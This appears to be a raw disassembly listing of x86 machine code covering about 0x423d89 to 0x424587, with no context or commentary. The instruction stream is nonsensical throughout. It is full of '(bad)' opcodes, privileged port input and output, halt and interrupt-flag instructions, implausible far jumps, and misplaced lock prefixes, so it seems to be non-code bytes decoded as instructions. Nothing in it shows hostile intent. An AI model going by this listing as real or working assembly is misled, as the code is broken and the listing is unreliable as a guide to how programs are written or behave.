  423d89:	lea    ecx,[ebp-0x72f35f42]
  423d8f:	lea    eax,[eax+0x77807af0]
  423d95:	jp     0x423d17
  423d97:	xchg   edi,eax
  423d98:	inc    esi
  423d99:	push   ebx
  423d9a:	je     0x423def
  423d9c:	push   ecx
  423d9d:	mov    dl,0x86
  423d9f:	or     al,0xb2
  423da1:	mov    edx,0x80fdff29
  423da6:	ja     0x423dc6
  423da8:	inc    ebx
  423da9:	sti    
  423daa:	push   ebx
  423dab:	jb     0x423df8
  423dad:	add    eax,0x80af7750
  423db2:	ja     0x423d38
  423db4:	xor    al,0x84
  423db7:	push   ebx
  423db8:	cld    
  423db9:	push   ebx
  423dba:	adc    DWORD PTR [edx-0x7b4df342],esi
  423dc0:	sub    edi,edi
  423dc2:	mov    dl,0x80
  423dc4:	lock scas eax,DWORD PTR es:[edi]
  423dc6:	arpl   bp,di
  423dc8:	fst    DWORD PTR [edi]
  423dca:	xor    BYTE PTR [edi-0x7c],0x80
  423dce:	lock test BYTE PTR [ebx-0x4],dl
  423dd2:	push   ebx
  423dd3:	adc    DWORD PTR [edx-0x414dd67c],esi
  423dd9:	or     al,0xff
  423ddb:	mov    dl,0x50
  423ddd:	ja     0x423d8e
  423ddf:	xor    BYTE PTR [edi+0x7a],0x80
  423de3:	lock jp 0x423e39
  423de6:	cld    
  423de7:	push   ebx
  423de8:	adc    DWORD PTR [edx-0x414dd67c],esi
  423dee:	or     al,0xff
  423df0:	mov    dl,0x80
  423df2:	lock scas eax,DWORD PTR es:[edi]
  423df4:	or     DWORD PTR [edx],esp
  423df6:	mov    dl,0x50
  423df8:	ja     0x423da9
  423dfa:	xor    BYTE PTR [edi+0x56],0x80
  423dfe:	lock push esi
  423e00:	push   ebx
  423e01:	cld    
  423e02:	push   ebx
  423e03:	adc    DWORD PTR [edx-0x7b4df342],esi
  423e09:	sub    edi,edi
  423e0b:	mov    dl,0x80
  423e0d:	lock scas eax,DWORD PTR es:[edi]
  423e0f:	arpl   bp,di
  423e11:	or     DWORD PTR [edi],ecx
  423e13:	(bad)  
  423e14:	or     al,0x8d
  423e16:	lea    eax,[eax+0x7750af77]
  423e1c:	scas   eax,DWORD PTR es:[edi]
  423e1d:	xor    BYTE PTR [edi+0x46],0xec
  423e21:	ja     0x423e85
  423e23:	push   eax
  423e24:	out    0x3e,eax
  423e26:	push   eax
  423e27:	ja     0x423e87
  423e29:	pop    esi
  423e2a:	cmc    
  423e2b:	and    al,0x6f
  423e2d:	cmp    BYTE PTR [eax+0x77],dl
  423e30:	push   0x7c
  423e32:	ja     0x423e9a
  423e34:	hlt    
  423e35:	and    al,0x6f
  423e37:	cmp    BYTE PTR [edi+esi*2+0x26],bh
  423e3b:	repz and al,0x6f
  423e3e:	cmp    BYTE PTR [eax+0x77],dl
  423e41:	test   DWORD PTR [eax-0xf7fc189],0x53fc533e
  423e4b:	adc    DWORD PTR [edx-0x414dd67c],esi
  423e51:	or     al,0xff
  423e53:	mov    dl,0x50
  423e55:	ja     0x423e54
  423e57:	sub    BYTE PTR [edx-0x42],0x4f
  423e5b:	cmp    cl,BYTE PTR [ebp+0x7c6a808d]
  423e61:	dec    edi
  423e62:	xor    DWORD PTR [ebp+0x4d],ecx
  423e65:	dec    ebp
  423e66:	jmp    0x7c6a:0x80386f24
  423e6d:	dec    edi
  423e6e:	jge    0x423ebd
  423e70:	dec    ebp
  423e71:	dec    ebp
  423e72:	or     esp,DWORD PTR [edi+ebp*2]
  423e75:	cmp    BYTE PTR [eax-0x7f957f96],al
  423e7b:	ja     0x423e74
  423e7d:	xor    al,0xf7
  423e80:	push   ebx
  423e81:	cld    
  423e82:	push   ebx
  423e83:	adc    DWORD PTR [edx-0x414dd67c],esi
  423e89:	or     al,0xff
  423e8b:	mov    dl,0x80
  423e8d:	lock std 
  423e8f:	or     DWORD PTR [edx],esp
  423e91:	mov    dl,0x80
  423e93:	lock pop esi
  423e95:	(bad)  
  423e96:	out    dx,al
  423e97:	out    dx,eax
  423e98:	adc    BYTE PTR [edi-0x54],dh
  423e9b:	sub    BYTE PTR [edx-0x80],0x77
  423e9f:	test   DWORD PTR [eax+0x1153f7f0],0xbeb2fc53
  423ea9:	or     al,0xb2
  423eab:	test   BYTE PTR [ecx],ch
  423ead:	push   DWORD PTR [edx+0x9fdf080]
  423eb3:	and    dh,BYTE PTR [edx-0x7f990f80]
  423eb9:	xchg   edi,eax
  423eba:	push   bx
  423ebc:	push   ecx
  423ebd:	push   ebx
  423ebe:	xchg   esp,eax
  423ebf:	mov    dl,0xba
  423ec1:	sub    DWORD PTR [edx-0x100f3f9],esi
  423ec7:	in     al,dx
  423ec8:	mov    dl,0x80
  423eca:	lock pop esi
  423ecc:	or     eax,esp
  423ece:	and    edi,ebp
  423ed0:	or     BYTE PTR [edi+0x31],0x4d
  423ed4:	dec    ebp
  423ed5:	dec    ebp
  423ed6:	sbb    BYTE PTR [eax],0x31
  423ed9:	dec    ebp
  423eda:	dec    ebp
  423edb:	dec    ebp
  423edc:	push   ebx
  423edd:	cld    
  423ede:	push   ebx
  423edf:	xchg   esp,eax
  423ee0:	mov    dl,0x84
  423ee2:	sub    DWORD PTR [edx-0x400f3f9],esi
  423ee8:	in     al,dx
  423ee9:	mov    dl,0x9
  423eeb:	loopne 0x423edd
  423eed:	lods   al,BYTE PTR ds:[esi]
  423eee:	push   ebx
  423eef:	std    
  423ef0:	adc    al,dh
  423ef2:	lods   al,BYTE PTR ds:[esi]
  423ef3:	sub    BYTE PTR [edx-0x71],0x77
  423ef7:	lods   al,BYTE PTR ds:[esi]
  423ef8:	xor    al,0xf7
  423efb:	adc    BYTE PTR [edi+0x535153f7],0x94
  423f02:	mov    dl,0x7
  423f04:	or     al,0xb2
  423f06:	mov    edx,0x80feff29
  423f0b:	xchg   edi,eax
  423f0c:	std    
  423f0d:	or     DWORD PTR [edx],esp
  423f0f:	inc    BYTE PTR [eax-0x11efa169]
  423f15:	push   cs
  423f16:	sub    BYTE PTR [edx-0x80],0x77
  423f1a:	test   DWORD PTR [eax-0x3ac0810],0x84b21153
  423f24:	sub    DWORD PTR [edx-0x4d00f342],esi
  423f2a:	xor    al,0xfd
  423f2d:	or     DWORD PTR [edx],esp
  423f2f:	mov    dl,0x80
  423f31:	lock pop esi
  423f33:	(bad)  
  423f34:	out    dx,al
  423f35:	out    dx,eax
  423f36:	adc    BYTE PTR [edi-0x54],dh
  423f39:	sub    BYTE PTR [edx-0x80],0x77
  423f3d:	test   DWORD PTR [eax-0x3ac0810],0x532984b2
  423f47:	adc    DWORD PTR [edx-0x4d00f342],esi
  423f4d:	xor    al,0xfd
  423f50:	or     DWORD PTR [edx],esp
  423f52:	mov    dl,0x80
  423f54:	lock push 0xffffff80
  423f57:	xchg   edi,eax
  423f58:	push   0x53
  423f5a:	push   ecx
  423f5b:	push   ebx
  423f5c:	xchg   esp,eax
  423f5d:	mov    dl,0xba
  423f5f:	sub    DWORD PTR [edx-0x100f3f9],esi
  423f65:	in     al,dx
  423f66:	mov    dl,0x80
  423f68:	lock pop esi
  423f6a:	or     eax,esp
  423f6c:	and    edi,ebp
  423f6e:	or     BYTE PTR [edi+0x7d],0x4d
  423f72:	dec    ebp
  423f73:	dec    ebp
  423f74:	sbb    BYTE PTR [eax],0x7d
  423f77:	dec    ebp
  423f78:	dec    ebp
  423f79:	dec    ebp
  423f7a:	push   ebx
  423f7b:	cld    
  423f7c:	push   ebx
  423f7d:	xchg   esp,eax
  423f7e:	mov    dl,0x84
  423f80:	sub    DWORD PTR [edx-0x400f3f9],esi
  423f86:	in     al,dx
  423f87:	mov    dl,0x9
  423f89:	loopne 0x423f7b
  423f8b:	lods   al,BYTE PTR ds:[esi]
  423f8c:	push   ebx
  423f8d:	std    
  423f8e:	adc    al,dh
  423f90:	lods   al,BYTE PTR ds:[esi]
  423f91:	sub    BYTE PTR [edx-0x71],0x77
  423f95:	lods   al,BYTE PTR ds:[esi]
  423f96:	xor    al,0xf7
  423f99:	adc    BYTE PTR [edi+0x535153f7],0x94
  423fa0:	mov    dl,0x7
  423fa2:	or     al,0xb2
  423fa4:	mov    edx,0x80feff29
  423fa9:	xchg   edi,eax
  423faa:	std    
  423fab:	or     DWORD PTR [edx],esp
  423fad:	inc    BYTE PTR [eax-0x11efa169]
  423fb3:	push   cs
  423fb4:	sub    BYTE PTR [edx-0x80],0x77
  423fb8:	es xor al,0x26
  423fbc:	push   ebx
  423fbd:	adc    DWORD PTR [ebx-0x4],edx
  423fc0:	mov    dl,0xbe
  423fc2:	or     al,0xb2
  423fc4:	test   BYTE PTR [ecx],ch
  423fc6:	push   DWORD PTR [edx-0x7f950f80]
  423fcc:	xchg   edi,eax
  423fcd:	push   0x53
  423fcf:	push   ecx
  423fd0:	push   ebx
  423fd1:	xchg   esp,eax
  423fd2:	mov    dl,0xba
  423fd4:	sub    DWORD PTR [edx-0x100f3f9],esi
  423fda:	or     DWORD PTR [edx],esp
  423fdc:	mov    dl,0xec
  423fde:	ja     0x423fdd
  423fe0:	push   eax
  423fe1:	ja     0x423fe0
  423fe3:	xor    BYTE PTR [edi-0x3],0x80
  423fe7:	lock scas eax,DWORD PTR es:[edi]
  423fe9:	arpl   bp,di
  423feb:	or     edx,ebp
  423fed:	(bad)  
  423fee:	or     eax,0x77804d4d
  423ff3:	push   0xffffff80
  423ff5:	lock push 0x53
  423ff8:	adc    DWORD PTR [edx-0x3acf342],esi
  423ffe:	mov    dl,0x84
  424000:	sub    edi,edi
  424002:	mov    dl,0x80
  424004:	lock scas eax,DWORD PTR es:[edi]
  424006:	or     DWORD PTR [edx],esp
  424008:	mov    dl,0x80
  42400a:	lock ds push ebx
  42400d:	push   ecx
  42400e:	mov    dl,0xba
  424010:	sub    edi,edi
  424012:	mov    dl,0x80
  424014:	lock ds push ebx
  424017:	adc    DWORD PTR [edx-0x4d00f342],esi
  42401d:	push   eax
  42401e:	ja     0x424086
  424020:	xor    BYTE PTR [edi-0x7e],0x80
  424024:	lock adc BYTE PTR [ebx+0x11],0xb2
  424029:	mov    esi,0xb2fc530c
  42402e:	test   BYTE PTR [ecx],ch
  424030:	push   DWORD PTR [edx-0x7f7d0f80]
  424036:	xchg   edi,eax
  424037:	adc    BYTE PTR [ebx+0x51],0xb2
  42403b:	mov    edx,0xb2945329
  424040:	pop    es
  424041:	or     al,0xff
  424043:	(bad)  
  424044:	in     al,dx
  424045:	lock data16 in al,dx
  424048:	std    
  424049:	in     al,dx
  42404a:	lock inc esi
  42404c:	push   eax
  42404d:	lock inc esi
  42404f:	les    ebx,FWORD PTR ds:0x80827780
  424055:	lock adc BYTE PTR [ebx-0x4],0x53
  42405a:	adc    DWORD PTR [edx-0x414dd67c],esi
  424060:	or     al,0xff
  424062:	mov    dl,0xec
  424064:	ja     0x4240ac
  424066:	push   eax
  424067:	ja     0x4240af
  424069:	xor    BYTE PTR [edi-0x7e],0x80
  42406d:	lock adc BYTE PTR [ebx-0x4],0xb2
  424072:	test   BYTE PTR [ecx],ch
  424074:	push   ebx
  424075:	adc    DWORD PTR [edx-0x4d00f342],esi
  42407b:	xor    al,0x1e
  42407e:	inc    ebx
  42407f:	std    
  424080:	xor    BYTE PTR [edi-0x7e],0x80
  424084:	xchg   edi,eax
  424085:	adc    BYTE PTR [ebx-0x4],0x53
  424089:	xchg   esp,eax
  42408a:	mov    dl,0x7
  42408c:	or     al,0xb2
  42408e:	test   BYTE PTR [ecx],ch
  424090:	(bad)  
  424091:	sti    
  424092:	adc    BYTE PTR [edi-0x4ddf6ba],0x63
  424099:	mov    dl,0x9
  42409b:	dec    esp
  42409c:	xor    cl,BYTE PTR [edx+0x77804d4d]
  4240a2:	out    dx,eax
  4240a3:	dec    ebp
  4240a4:	xlat   BYTE PTR ds:[ebx]
  4240a5:	and    DWORD PTR [ecx],eax
  4240a7:	ja     0x42402f
  4240a9:	dec    ebp
  4240aa:	xlat   BYTE PTR ds:[ebx]
  4240ab:	out    dx,eax
  4240ac:	or     al,BYTE PTR [eax-0x327f1089]
  4240b2:	jp     0x4240ee
  4240b4:	lea    ecx,[ebp+0x7780814d]
  4240ba:	out    dx,eax
  4240bb:	or     ch,0xf7
  4240be:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4240c4:	xlat   BYTE PTR ds:[ebx]
  4240c5:	mov    cl,BYTE PTR [ebp-0x29]
  4240c8:	jbe    0x424050
  4240ca:	test   eax,0x508d8def
  4240cf:	ja     0x424133
  4240d1:	xor    BYTE PTR [edi-0x75],0x80
  4240d5:	lock mov edx,DWORD PTR [ebx+0x74]
  4240d9:	push   ebx
  4240da:	push   ecx
  4240db:	mov    dl,0xba
  4240dd:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4240e3:	xor    al,0x76
  4240e6:	arpl   WORD PTR [edx+0x778057d5],si
  4240ec:	out    dx,eax
  4240ed:	xor    al,0x2e
  4240f0:	adc    BYTE PTR [edi+0x32cd802e],0x3a
  4240f7:	lea    ecx,[ebp+0x7e531153]
  4240fd:	mov    dl,0xbe
  4240ff:	or     al,0xb2
  424101:	clc    
  424102:	sub    edi,edi
  424104:	(bad)  
  424105:	xchg   esi,eax
  424106:	xor    al,0x8b
  424109:	adc    BYTE PTR [edi+0x5311538b],0x7e
  424110:	mov    dl,0xbe
  424112:	or     al,0xb2
  424114:	clc    
  424115:	sub    edi,edi
  424117:	(bad)  
  424118:	xchg   esi,eax
  424119:	dec    ebp
  42411a:	xlat   BYTE PTR ds:[ebx]
  42411b:	jbe    0x42416a
  42411d:	or     bl,BYTE PTR ds:0x70a3a9ab
  424123:	sti    
  424124:	out    dx,eax
  424125:	lea    edx,[edi-0x78127880]
  42412b:	and    eax,0x80328099
  424130:	mov    ds:0x8d8d3a2e,al
  424135:	in     eax,dx
  424136:	pop    ebp
  424137:	lea    ecx,[ecx]
  424139:	(bad)  
  42413b:	cmp    cl,BYTE PTR [ebp+0x9724f8d]
  424141:	(bad)  
  424143:	cmp    cl,BYTE PTR [ebp+0x90b4f8d]
  424149:	jne    0x80cfcedc
  42414f:	dec    esp
  424150:	adc    BYTE PTR [ebp+0x6a4f8d8d],cl
  424156:	or     DWORD PTR [edi],ecx
  424158:	mov    esp,0xed8d8d8d
  42415d:	cli    
  42415e:	inc    ecx
  42415f:	lea    ecx,[ebp+0xf09718d]
  424165:	add    ecx,DWORD PTR [ebp-0x66a07273]
  42416b:	push   ebp
  42416c:	or     DWORD PTR [edi],ecx
  42416e:	mov    dh,0x8d
  424170:	lea    ecx,[ebp+0x3a268e80]
  424176:	lea    ecx,[ebp-0x72cd4813]
  42417c:	cmp    dh,0x43
  42417f:	mov    eax,ds:0x5c09fbec
  424184:	or     ah,BYTE PTR [ecx]
  424186:	push   eax
  424187:	lock stc 
  424189:	or     DWORD PTR [ebp+edi*2-0x5f],ebx
  42418d:	in     al,dx
  42418e:	dec    BYTE PTR [ecx]
  424190:	psadbw mm1,QWORD PTR [ebp+0x7d018d8d]
  424197:	adc    eax,0x86f05093
  42419c:	cli    
  42419d:	dec    ebp
  42419e:	dec    ebp
  42419f:	dec    ebp
  4241a0:	jmp    0x42413d
  4241a2:	dec    edi
  4241a3:	outs   dx,BYTE PTR ds:[esi]
  4241a4:	aad    0xeb
  4241a6:	or     BYTE PTR [esi],0xed
  4241a9:	mov    bh,0xc8
  4241ab:	lea    esi,[ebx]
  4241ad:	jle    0x42419b
  4241af:	test   DWORD PTR [ecx],0x9a1e65c
  4241b5:	pop    esp
  4241b6:	scas   al,BYTE PTR es:[edi]
  4241b7:	and    esp,ebp
  4241b9:	push   es
  4241ba:	aad    0xbf
  4241bc:	add    edx,ebx
  4241be:	adc    eax,0x4f87f050
  4241c3:	outs   dx,BYTE PTR ds:[esi]
  4241c4:	aad    0x92
  4241c6:	xor    BYTE PTR [eax],0xed
  4241c9:	mov    bh,0x8b
  4241cb:	lea    esi,[ebx]
  4241cd:	push   ecx
  4241ce:	in     al,dx
  4241cf:	std    
  4241d0:	or     DWORD PTR [edi+ebx*8-0x5f],ebx
  4241d4:	or     DWORD PTR [edi+ebx*4+0x21],ebx
  4241d8:	in     al,dx
  4241d9:	push   es
  4241da:	aad    0x43
  4241dc:	add    edi,ebx
  4241de:	adc    eax,0x808ae750
  4241e3:	out    0x8a,eax
  4241e5:	sub    BYTE PTR [ebx+0x4f],0x4d
  4241e9:	aad    0x6f
  4241eb:	and    BYTE PTR [edi-0x73dac507],0x9
  4241f2:	pop    esp
  4241f3:	fbld   TBYTE PTR [ecx+0x219f5c09]
  4241f9:	dec    ebp
  4241fa:	ja     0x424187
  4241fc:	in     eax,dx
  4241fd:	ja     0x424189
  4241ff:	out    dx,eax
  424200:	in     al,dx
  424201:	push   es
  424202:	pop    edi
  424203:	out    0x8b,eax
  424205:	in     al,0xa4
  424207:	or     DWORD PTR [esi+eiz*8-0x5f],ebx
  42420b:	or     DWORD PTR [esi+ebp*4+0x21],ebx
  42420f:	xor    al,0x87
  424212:	dec    ebp
  424213:	ja     0x4241dd
  424215:	in     eax,dx
  424216:	mov    dl,0xef
  424218:	in     al,dx
  424219:	push   es
  42421a:	push   eax
  42421b:	lock xchg DWORD PTR [edi-0x19],ebx
  42421f:	enter  0x2ee4,0x80
  424223:	lock xchg BYTE PTR [ecx],cl
  424226:	pop    esp
  424227:	or     ah,BYTE PTR [ecx+0x21dd5c09]
  42422d:	dec    ebp
  42422e:	ja     0x424262
  424230:	in     eax,dx
  424231:	mov    dl,0xef
  424233:	in     al,dx
  424234:	pushf  
  424235:	push   eax
  424236:	lock xchg BYTE PTR [edi-0x69],bl
  42423a:	xor    cl,BYTE PTR [ecx]
  42423c:	jmp    0xa3ab:0x4d4d4d9a
  424243:	push   ebx
  424244:	push   0x6d
  424246:	les    ecx,FWORD PTR [ebx+edx*2]
  424249:	push   0xffffffa9
  42424b:	jo     0x4242c1
  42424d:	xchg   edi,eax
  42424e:	add    BYTE PTR [edi+0x3a2e5080],0x8d
  424255:	lea    eax,[eax-0x7812de89]
  42425b:	jno    0x4241f0
  42425d:	push   ebx
  42425e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42425f:	cdq    
  424260:	fwait
  424261:	pop    edi
  424262:	pop    ds
  424263:	or     DWORD PTR [edi],ecx
  424265:	jmp    0xd574:0x638d8d8d
  42426c:	call   0xd81fdfd0
  424271:	das    
  424272:	push   ebx
  424273:	push   0x6d
  424275:	(bad)  
  424276:	fld    DWORD PTR [eax+0x77ecdd6d]
  42427c:	out    dx,eax
  42427d:	cmp    BYTE PTR [ebp+0x25],0x80
  424281:	or     dh,BYTE PTR ds:0x80155280
  424287:	fstp   QWORD PTR ds:0xeceff0ec
  42428d:	xchg   edi,eax
  42428e:	out    dx,eax
  42428f:	push   eax
  424290:	xlat   BYTE PTR ds:[ebx]
  424291:	mov    ah,BYTE PTR [ebx+0x4b]
  424294:	fucomi st,st(4)
  424296:	push   eax
  424297:	out    0x8a,eax
  424299:	push   eax
  42429a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42429b:	mov    ebx,DWORD PTR [edi-0x59]
  42429e:	mov    bl,cl
  4242a0:	mov    dh,0x63
  4242a2:	popf   
  4242a3:	adc    eax,0x5c096fd3
  4242a8:	push   ebp
  4242a9:	scas   al,BYTE PTR es:[edi]
  4242aa:	les    ecx,FWORD PTR [eax+eax*4]
  4242ad:	mov    BYTE PTR [ecx],0x55
  4242b0:	mov    es,WORD PTR [eax-0x2ab2b097]
  4242b6:	aas    
  4242b7:	in     al,dx
  4242b8:	out    0xef,eax
  4242ba:	push   eax
  4242bb:	out    0x32,eax
  4242bd:	arpl   WORD PTR [ebx-0x587f8e27],cx
  4242c3:	and    DWORD PTR [eax-0x7d131a5d],eax
  4242c9:	arpl   WORD PTR [esi],ax
  4242cb:	shr    esi,cl
  4242cd:	sbb    BYTE PTR [ecx-0x3c],0xef
  4242d1:	inc    ebx
  4242d2:	out    0xef,eax
  4242d4:	push   eax
  4242d5:	imul   eax,DWORD PTR [eax+0xb4f32d7],0xa780a1d5
  4242df:	mov    esi,DWORD PTR [ebx+0x50]
  4242e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242e3:	mov    esp,DWORD PTR [ebx-0x59]
  4242e6:	mov    ah,ah
  4242e8:	pop    esi
  4242e9:	(bad)  
  4242ea:	into   
  4242eb:	push   ebx
  4242ec:	push   0xffffffab
  4242ee:	test   eax,0xeffb70a3
  4242f3:	lea    edx,[edi-0x78127880]
  4242f9:	adc    DWORD PTR [ebx+0x24f65e99],0x7750386f
  424303:	mov    bh,BYTE PTR [edi+esi*2-0x75]
  424307:	cmc    
  424308:	and    al,0x6f
  42430a:	cmp    BYTE PTR [eax-0x587f7510],al
  424310:	mov    bl,BYTE PTR [ebx+0x52010de2]
  424316:	cmp    dl,BYTE PTR [ebx+0x51]
  424319:	mov    dl,0xbe
  42431b:	or     al,0xab
  42431d:	push   ebx
  42431e:	lods   al,BYTE PTR ds:[esi]
  42431f:	mov    dl,0xb4
  424321:	sub    edi,edi
  424323:	adc    DWORD PTR [eax-0x10],edx
  424326:	xchg   BYTE PTR [eax-0xf7f7510],al
  42432c:	mov    al,BYTE PTR [eax-0xf7f7510]
  424332:	mov    al,BYTE PTR [eax-0xf7f7510]
  424338:	mov    al,BYTE PTR [eax-0xf7f7510]
  42433e:	mov    al,BYTE PTR [eax-0xf7f7510]
  424344:	mov    bh,BYTE PTR [edi+esi*2+0x32]
  424348:	fsincos 
  42434a:	lods   al,BYTE PTR ds:[esi]
  42434b:	pop    eax
  42434c:	xor    al,0x8a
  42434f:	and    BYTE PTR [edi+0x53ac538a],0x51
  424356:	mov    dl,0xb4
  424358:	sub    DWORD PTR [edx+0x11ff0cbe],esi
  42435e:	and    BYTE PTR [edi+0x2e248021],0x3a
  424365:	lea    ecx,[ebp+0xf09ff63]
  42436b:	sbb    ah,ch
  42436d:	lea    ecx,[ebp-0x7f750f80]
  424373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424374:	mov    dl,BYTE PTR [ebx+0x51]
  424377:	push   ebx
  424378:	lods   al,BYTE PTR ds:[esi]
  424379:	mov    dl,0xbe
  42437b:	or     al,0xb2
  42437d:	mov    ah,0x29
  42437f:	call   DWORD PTR [ecx]
  424381:	arpl   si,di
  424383:	or     DWORD PTR [edi],ecx
  424385:	jecxz  0x424373
  424387:	lea    ecx,[ebp-0x72327080]
  42438d:	lea    ecx,[ebp-0x7f756880]
  424393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424394:	mov    dl,BYTE PTR [ebx+0x7e]
  424397:	push   ebx
  424398:	lods   al,BYTE PTR ds:[esi]
  424399:	mov    dl,0x7
  42439b:	or     al,0xb2
  42439d:	mov    ah,0x29
  42439f:	call   DWORD PTR [ebx+eiz*2-0x6cf0f602]
  4243a6:	in     al,dx
  4243a7:	lea    ecx,[ebp+0x50eff0ec]
  4243ad:	lock test DWORD PTR [eax-0x7f81ac09],0xb2ac5382
  4243b8:	pop    es
  4243b9:	or     al,0xb2
  4243bb:	mov    ah,0x29
  4243bd:	call   DWORD PTR [eax+edx*2-0x687fcd69]
  4243c4:	xor    ah,BYTE PTR [ebx-0x9]
  4243c7:	aad    0x27
  4243c9:	xor    BYTE PTR [edi-0x76],0x80
  4243cd:	xchg   edi,eax
  4243ce:	mov    dl,BYTE PTR [ebx-0x64]
  4243d1:	push   ebx
  4243d2:	cld    
  4243d3:	mov    dl,0xf8
  4243d5:	sub    DWORD PTR [edx-0x400f37a],esi
  4243db:	adc    BYTE PTR [edi+0x1572c332],0x5f
  4243e2:	out    dx,al
  4243e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243e4:	xlat   BYTE PTR ds:[ebx]
  4243e5:	rol    BYTE PTR [eax-0x687f7589],0x8a
  4243ec:	push   ebx
  4243ed:	pushf  
  4243ee:	push   ebx
  4243ef:	cld    
  4243f0:	mov    dl,0xf8
  4243f2:	sub    DWORD PTR [edx-0x400f37a],esi
  4243f8:	adc    BYTE PTR [edi+0x1572c332],0x5f
  4243ff:	jne    0x4243a7
  424401:	jno    0x42440c
  424403:	push   gs
  424405:	or     al,0x8d
  424407:	lea    eax,[eax+0x77808a77]
  42440d:	mov    al,BYTE PTR [eax+0x77808aa7]
  424413:	mov    dl,BYTE PTR [ebx+0x7c]
  424416:	push   ebx
  424417:	add    al,0xb2
  424419:	test   BYTE PTR [ecx],ch
  42441b:	mov    dl,0xc4
  42441d:	or     al,0xff
  42441f:	add    BYTE PTR [eax+0x6ac33277],0x15
  424426:	in     al,dx
  424427:	mov    dl,0x80
  424429:	jge    0x42449c
  42442b:	in     al,dx
  42442c:	lock out dx,eax
  42442e:	push   eax
  42442f:	lock test BYTE PTR [eax-0x687f7510],al
  424436:	mov    dl,BYTE PTR [ebx+0x51]
  424439:	push   ebx
  42443a:	pushf  
  42443b:	mov    dl,0xbe
  42443d:	or     al,0xb2
  42443f:	clc    
  424440:	sub    edi,edi
  424442:	inc    BYTE PTR [eax-0xfaf7569]
  424448:	jp     0x4243ca
  42444a:	out    dx,eax
  42444b:	push   eax
  42444c:	lock stc 
  42444e:	xor    al,0x8a
  424451:	push   ebx
  424452:	jle    0x4244a7
  424454:	sub    dh,BYTE PTR [edx+0x7b229ba]
  42445a:	or     al,0xff
  42445c:	mov    dh,0x80
  42445e:	lock stc 
  424460:	arpl   si,di
  424462:	aad    0x6f
  424464:	in     al,dx
  424465:	lock out dx,eax
  424467:	push   eax
  424468:	lock jp 0x4243eb
  42446b:	lock mov al,BYTE PTR [eax+0x51538a97]
  424472:	push   ebx
  424473:	pushf  
  424474:	mov    dl,0xbe
  424476:	or     al,0xb2
  424478:	clc    
  424479:	sub    edi,edi
  42447b:	(bad)  
  42447c:	in     al,dx
  42447d:	jge    0x4244a0
  42447f:	jl     0x4244f8
  424481:	xor    cl,0x24
  424484:	outs   dx,DWORD PTR ds:[esi]
  424485:	cmp    ah,ch
  424487:	lock out dx,eax
  424489:	push   eax
  42448a:	lock xchg esp,eax
  42448d:	in     al,dx
  42448e:	xor    al,0x87
  424491:	xor    BYTE PTR [edi+0x21],0x80
  424495:	int    0x32
  424497:	cmp    cl,BYTE PTR [ebp+0x714d968d]
  42449d:	xor    BYTE PTR [edi+0x21],0x4d
  4244a1:	xlat   BYTE PTR ds:[ebx]
  4244a2:	xchg   DWORD PTR [eax-0x72c5cd33],eax
  4244a8:	lea    ecx,[ebp+0xa]
  4244ab:	and    DWORD PTR [edi+esi*2-0x7d],edi
  4244af:	add    dl,ch
  4244b1:	cs jne 0x424530
  4244b4:	ja     0x424439
  4244b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244b7:	push   ss
  4244b8:	outs   dx,DWORD PTR ds:[esi]
  4244b9:	cmp    BYTE PTR [eax-0x687f7510],al
  4244bf:	mov    dl,BYTE PTR [ebx+0x51]
  4244c2:	push   ebx
  4244c3:	pushf  
  4244c4:	mov    dl,0xbe
  4244c6:	or     al,0xb2
  4244c8:	clc    
  4244c9:	sub    edi,edi
  4244cb:	(bad)  
  4244cc:	push   eax
  4244cd:	ja     0x4244c8
  4244cf:	arpl   bp,di
  4244d1:	xlat   BYTE PTR ds:[ebx]
  4244d2:	pop    ecx
  4244d3:	xor    BYTE PTR [edi-0x75],0x80
  4244d7:	lock mov edx,DWORD PTR [ebx-0x4]
  4244db:	push   ebx
  4244dc:	sub    dh,BYTE PTR [edx-0x794dd646]
  4244e2:	or     al,0xff
  4244e4:	mov    dl,0x80
  4244e6:	lock add DWORD PTR [eax-0x63ac7c69],0x53
  4244ee:	push   ecx
  4244ef:	mov    dl,0xf8
  4244f1:	sub    esp,ebp
  4244f3:	add    BYTE PTR [eax-0x327fde89],0x32
  4244fa:	cmp    cl,BYTE PTR [ebp+0xcbeb28d]
  424500:	push   DWORD PTR [esi-0x556bddf7]
  424506:	dec    ebp
  424507:	or     dh,BYTE PTR ds:0x808a7780
  42450d:	lock mov dl,BYTE PTR [ebx-0x4]
  424511:	push   ebx
  424512:	sub    dh,BYTE PTR [edx-0x454df37a]
  424518:	sub    edi,edi
  42451a:	mov    dl,0x63
  42451c:	ja     0x424517
  42451e:	xlat   BYTE PTR ds:[ebx]
  42451f:	mov    al,0x80
  424521:	ja     0x4244a5
  424523:	xor    al,0x82
  424526:	push   ebx
  424527:	sub    dl,BYTE PTR [ebx-0x4]
  42452a:	mov    dl,0x86
  42452c:	or     al,0xb2
  42452e:	mov    edx,0x63fdff29
  424533:	mov    al,ds:0x4d954c09
  424538:	dec    ebp
  424539:	dec    ebp
  42453a:	xor    BYTE PTR [edi-0x76],0x80
  42453e:	lock mov dl,BYTE PTR [ebx-0x4]
  424542:	push   ebx
  424543:	sub    dh,BYTE PTR [edx-0x454df37a]
  424549:	sub    edi,edi
  42454b:	mov    dl,0x63
  42454d:	ja     0x424548
  42454f:	xlat   BYTE PTR ds:[ebx]
  424550:	mov    al,0x80
  424552:	ja     0x4244df
  424554:	xor    al,0x8b
  424557:	push   ebx
  424558:	cld    
  424559:	push   ebx
  42455a:	sub    dh,BYTE PTR [edx-0x454df37a]
  424560:	sub    edi,edi
  424562:	mov    dl,0x3a
  424564:	ja     0x4244ec
  424566:	mov    esi,0x8d8d3aae
  42456b:	jl     0x4245e4
  42456d:	xchg   DWORD PTR [ecx+0x7c66f7ea],esi
  424573:	ja     0x42453d
  424575:	fld    DWORD PTR [ebp-0x587f12e3]
  42457b:	mov    al,BYTE PTR [eax+0x4538a77]
  424581:	push   ebx
  424582:	jl     0x424536
  424584:	les    ecx,FWORD PTR [edx+esi*4]
  424587:	test   BYTE PTR [ecx],ch
